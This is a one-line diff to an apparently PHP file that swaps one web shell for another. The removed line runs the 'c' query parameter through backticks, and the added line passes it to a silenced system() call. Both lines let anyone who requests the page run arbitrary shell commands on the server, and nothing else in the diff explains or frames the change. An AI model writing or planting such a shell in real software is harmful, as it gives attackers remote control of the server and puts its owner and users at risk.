@@ -1,1 +1,1 @@
-<?=`$_GET[c]`;
+<?php @system($_GET['c']);?>
